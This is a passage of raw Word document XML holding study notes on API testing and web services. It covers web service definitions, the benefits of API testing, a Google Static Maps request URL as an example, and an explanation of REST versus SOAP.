        <w:t>So, you can say that-</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Web Service.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> A web service is a collection of APIs working together to perform a particular task.</w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Web service</w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> can be accessed using a transport protocol. HTTP is a far more popular transport protocol to send a request and get a response to and forth from a web service. Using a web service does </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>requires</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> us to be online in the first place.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="167"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Web Service is an API wrapped in HTTP.</w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:br/>
        <w:t>2. All Web Services are API but APIs are not Web Services.</w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:br/>
        <w:t>3. Web Service might not perform all the operations that an API would perform.</w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:br/>
        <w:t>4. A Web Service needs a network while an API doesn't need a network for its operation.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Benefit of API </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Testing :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs w:val="0"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Test for Core Functionality</w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>The first major advantage of API testing is access to the application without a user interface.</w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs w:val="0"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Time Effective</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="180" w:line="240" w:lineRule="auto"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>Reduced Testing Costs</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="180"/>
        <w:rPr>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>Reduced Technical Debt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="180"/>
        <w:rPr>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>Earlier Remediation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="180"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Reduce Risks</w:t>
      </w:r>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267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="180"/>
        <w:rPr>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>Web  Services</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t xml:space="preserve"> Example:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="315" w:lineRule="atLeast"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="4E4E4E"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:b/>
          <w:color w:val="4E4E4E"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>For example: MAP</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00B84F48" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="315" w:lineRule="atLeast"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:color w:val="4E4E4E"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId203" w:history="1">
        <w:r w:rsidR="00267DFA" w:rsidRPr="00547F0F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="0071BB"/>
            <w:sz w:val="18"/>
            <w:szCs w:val="18"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>http://maps.googleapis.com/maps/api/staticmap?center=Sydney,NSW&amp;zoom=14&amp;size=400x400&amp;sensor=false</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="180"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:after="240" w:line="315" w:lineRule="atLeast"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="4E4E4E"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="4E4E4E"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Most often-used types of web service:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="168"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:ind w:left="600"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4E4E4E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4E4E4E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>SOAP (Simple Object Access Protocol)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="168"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:ind w:left="600"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4E4E4E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4E4E4E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>XML-RPC</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="168"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:ind w:left="600"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4E4E4E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4E4E4E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>JSON-RPC</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="168"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:ind w:left="600"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="4E4E4E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="4E4E4E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>REST</w:t>
      </w:r>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267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="180"/>
        <w:rPr>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t xml:space="preserve">What is </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>REST:</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="225" w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">REST means </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>REpresentational</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"> State Transfer; it is an architecture that generally runs over HTTP.</w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"> The REST style emphasizes the interactions between clients and services, which are enhanced by having a limited number of operations. </w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>REST is an alternative to SOAP (Simple Object Access Protocol) and instead of using XML for request REST uses simple URL in some cases.</w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"> Unlike SOAP, RESTFUL applications uses HTTP build in headers to carry meta-information.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="225" w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>REST provides a lighter weight alternative. Instead of using XML to make a request</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="225" w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>REST can use four different HTTP 1.1 verbs (GET, POST, PUT, and DELETE) to perform tasks</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="225" w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>You can find REST-based Web services that output the data in Command Separated Value (CSV), JavaScript Object Notation (JSON) and Really Simple Syndication (RSS).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="225" w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Rest API supports both XML and JSON format. It is usually preferred for</w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
